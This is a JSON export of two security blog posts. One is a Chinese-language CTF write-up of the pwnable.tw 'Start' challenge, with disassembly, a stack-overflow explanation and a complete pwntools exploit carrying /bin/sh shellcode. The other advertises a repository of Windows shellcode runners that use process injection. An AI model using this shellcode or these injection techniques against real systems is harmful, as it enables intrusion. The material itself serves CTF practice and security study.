[{"content":"checksec:\n[*] \u0026#39;/home/kkkk/code/start\u0026#39; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) disassem:\nDump of assembler code for function _start: =\u0026gt; 0x08048060 \u0026lt;+0\u0026gt;:\tpush esp 0x08048061 \u0026lt;+1\u0026gt;:\tpush 0x804809d 0x08048066 \u0026lt;+6\u0026gt;:\txor eax,eax 0x08048068 \u0026lt;+8\u0026gt;:\txor ebx,ebx 0x0804806a \u0026lt;+10\u0026gt;:\txor ecx,ecx 0x0804806c \u0026lt;+12\u0026gt;:\txor edx,edx 0x0804806e \u0026lt;+14\u0026gt;:\tpush 0x3a465443 0x08048073 \u0026lt;+19\u0026gt;:\tpush 0x20656874 0x08048078 \u0026lt;+24\u0026gt;:\tpush 0x20747261 0x0804807d \u0026lt;+29\u0026gt;:\tpush 0x74732073 0x08048082 \u0026lt;+34\u0026gt;:\tpush 0x2774654c 0x08048087 \u0026lt;+39\u0026gt;:\tmov ecx,esp 0x08048089 \u0026lt;+41\u0026gt;:\tmov dl,0x14 0x0804808b \u0026lt;+43\u0026gt;:\tmov bl,0x1 0x0804808d \u0026lt;+45\u0026gt;:\tmov al,0x4 0x0804808f \u0026lt;+47\u0026gt;:\tint 0x80 0x08048091 \u0026lt;+49\u0026gt;:\txor ebx,ebx 0x08048093 \u0026lt;+51\u0026gt;:\tmov dl,0x3c 0x08048095 \u0026lt;+53\u0026gt;:\tmov al,0x3 0x08048097 \u0026lt;+55\u0026gt;:\tint 0x80 0x08048099 \u0026lt;+57\u0026gt;:\tadd esp,0x14 0x0804809c \u0026lt;+60\u0026gt;:\tret End of assembler dump. 程序是汇编编写的, 没有保护模式\n程序使用中断调用了两个系统调用, 一个是sys_write函数:\n0x08048087 \u0026lt;+39\u0026gt;:\tmov ecx,esp 0x08048089 \u0026lt;+41\u0026gt;:\tmov dl,0x14 0x0804808b \u0026lt;+43\u0026gt;:\tmov bl,0x1 0x0804808d \u0026lt;+45\u0026gt;:\tmov al,0x4 0x0804808f \u0026lt;+47\u0026gt;:\tint 0x80 一个是read函数:\n0x08048091 \u0026lt;+49\u0026gt;:\txor ebx,ebx 0x08048093 \u0026lt;+51\u0026gt;:\tmov dl,0x3c 0x08048095 \u0026lt;+53\u0026gt;:\tmov al,0x3 0x08048097 \u0026lt;+55\u0026gt;:\tint 0x80 系统调用号在线查询\nread函数的ecx是之前设置的ecx值, 并未更改\nmov ecx,esp ecx是esp\necx即使输出的目标地址也是输入的目标地址\n随后程序退出\nread函数读入0x3c字节, 会造成栈溢出, 且程序没有保护模式\n考虑re2shellcode, 需要注意payload大小不超过0x3c\n程序一共push了7*4个字节, 程序最后恢复0x14栈空间, ret时又消耗4字节, 于是此时esp里的值就是程序开始压入的esp的值\n此时esp是这样的:\nesp-\u0026gt;esp+4\n于是第一次覆盖返回地址到0x08048087, 即可调用sys_write输出esp+4的值, 第二次输入的起始位置是esp\n第一次覆盖只需要填充0x14字节任意内容, 用于抵消程序清栈操作\n0x08048099 \u0026lt;+57\u0026gt;:\tadd esp,0x14 然后以小端模式传入地址0x08048087\n泄露esp+4的值后, 第二次输入同理\n0x14字节任意内容 + (esp+4地址+0x14) + shellcode\n由于第二次输入的起始位置是esp, 泄露的esp是esp+4\n所以esp+4 + 0x14就到shellcode的位置了(32位程序指针占用4字节)\nEXP:\nfrom pwn import * r = remote(\u0026#34;chall.pwnable.tw\u0026#34;, 10000) # r = process(\u0026#34;./start\u0026#34;) shellcode = b\u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\u0026#34; payload1 = b\u0026#34;k\u0026#34;*(0x14) + p32(0x08048087) r.sendafter(b\u0026#34;Let\u0026#39;s start the CTF:\u0026#34;, payload1) esp = u32(r.recv(4)) r.recv() log.success(hex(esp)) payload2 = b\u0026#34;k\u0026#34;*(0x14) + p32(esp+0x14) + shellcode r.send(payload2) r.interactive() ","permalink":"https://b1n.io/posts/pwnable.tw-start/","summary":"checksec:\n[*] \u0026#39;/home/kkkk/code/start\u0026#39; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) disassem:\nDump of assembler code for function _start: =\u0026gt; 0x08048060 \u0026lt;+0\u0026gt;:\tpush esp 0x08048061 \u0026lt;+1\u0026gt;:\tpush 0x804809d 0x08048066 \u0026lt;+6\u0026gt;:\txor eax,eax 0x08048068 \u0026lt;+8\u0026gt;:\txor ebx,ebx 0x0804806a \u0026lt;+10\u0026gt;:\txor ecx,ecx 0x0804806c \u0026lt;+12\u0026gt;:\txor edx,edx 0x0804806e \u0026lt;+14\u0026gt;:\tpush 0x3a465443 0x08048073 \u0026lt;+19\u0026gt;:\tpush 0x20656874 0x08048078 \u0026lt;+24\u0026gt;:\tpush 0x20747261 0x0804807d \u0026lt;+29\u0026gt;:\tpush 0x74732073 0x08048082 \u0026lt;+34\u0026gt;:\tpush 0x2774654c 0x08048087 \u0026lt;+39\u0026gt;:\tmov ecx,esp 0x08048089 \u0026lt;+41\u0026gt;:\tmov dl,0x14 0x0804808b \u0026lt;+43\u0026gt;:\tmov bl,0x1 0x0804808d \u0026lt;+45\u0026gt;:\tmov al,0x4 0x0804808f \u0026lt;+47\u0026gt;:\tint 0x80 0x08048091 \u0026lt;+49\u0026gt;:\txor ebx,ebx 0x08048093 \u0026lt;+51\u0026gt;:\tmov dl,0x3c 0x08048095 \u0026lt;+53\u0026gt;:\tmov al,0x3 0x08048097 \u0026lt;+55\u0026gt;:\tint 0x80 0x08048099 \u0026lt;+57\u0026gt;:\tadd esp,0x14 0x0804809c \u0026lt;+60\u0026gt;:\tret End of assembler dump.","title":"Pwnable.tw Start"},{"content":"I made a repository of Windows Shellcode runners: cpp-shellcode.\nHere are some introductions:\ncpp-shellcode is A repository of Windows Shellcode runners. The applications load and execute Shellcode using various API calls or techniques.\n❤️ THANKS @go-shellcode\nThe available Shellcode runners include:\nCreateFiber CreateRemoteThread CreateThread EtwpCreateEtwThread NtQueueApcThreadEx-Local CreateFiber This application leverages the Windows CreateFiber function from the Kernel32.dll to execute shellcode within this application\u0026rsquo;s process. This is usefull when you want to avoid remote process injection and want to avoid calling CreateThread.\nCreateRemoteThread This application leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellocde in a remote process. The application requires that the target process to inject into is already running. The program default injecting Explorer.exe\nCreateThread This application leverages the Windows CreateThread function from Kernel32.dll to execute shellcode within this application\u0026rsquo;s process. This is usefull when you want to avoid remote process injection.\nEtwpCreateEtwThread This application leverages the Windows EtwpCreateEtwThread function from ntdll.dll to execute shellcode within this application\u0026rsquo;s process. Original work by TheWover. This is usefull when you want to avoid remote process injection.\nNtQueueApcThreadEx-Local This application uses the undocumented NtQueueApcThreadEx to create a \u0026ldquo;Special User APC\u0026rdquo; in the current thread of the current process to execute shellcode. Because the shellcode is loaded and executed in the current process, it is \u0026ldquo;local\u0026rdquo;. This same technique can be used for a remote process. NOTE: This will only work on Windows 7 or later. Reference APC Series: User APC API.\n","permalink":"https://b1n.io/posts/cpp-shellcode/","summary":"I made a repository of Windows Shellcode runners: cpp-shellcode.\nHere are some introductions:\ncpp-shellcode is A repository of Windows Shellcode runners. The applications load and execute Shellcode using various API calls or techniques.\n❤️ THANKS @go-shellcode\nThe available Shellcode runners include:\nCreateFiber CreateRemoteThread CreateThread EtwpCreateEtwThread NtQueueApcThreadEx-Local CreateFiber This application leverages the Windows CreateFiber function from the Kernel32.dll to execute shellcode within this application\u0026rsquo;s process. This is usefull when you want to avoid remote process injection and want to avoid calling CreateThread.","title":"Cpp Shellcode"}]